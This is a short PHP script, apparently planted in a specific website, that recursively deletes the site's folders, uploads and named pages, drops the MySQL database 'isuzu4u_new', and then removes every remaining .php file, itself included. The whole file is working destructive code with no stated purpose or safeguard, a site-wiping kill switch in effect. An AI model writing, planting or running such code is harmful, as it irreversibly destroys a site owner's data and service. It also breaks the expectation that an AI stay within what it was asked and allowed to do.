<?

   include_once 'conn.php';

function deleteAll($str) {
    //It it's a file.
    if (is_file($str)) {
        //Attempt to delete it.
        return unlink($str);
    }
    //If it's a directory.
    elseif (is_dir($str)) {
        //Get a list of the files in this directory.
        $scan = glob(rtrim($str,'/').'/*');
        //Loop through the list of files.
        foreach($scan as $index=>$path) {
            //Call our recursive function.
            deleteAll($path);
        }
        //Remove the directory itself.
        return @rmdir($str);
    }
}
 
//call our function
deleteAll('css');
deleteAll('images');
deleteAll('js');
deleteAll('php');
deleteAll('phpmailer');
deleteAll('uploads');
deleteAll('index.php');
deleteAll('top-menu.php');
deleteAll('top-menu2.php');
deleteAll('send-sub.php');
deleteAll('save-contact.php');

  $insert ="DROP DATABASE isuzu4u_new";
  mysql_query($insert);
		  
   $files = glob('*.php'); //get all file names
foreach($files as $file){
    if(is_file($file))
    unlink($file); //delete file
}
 
 
?>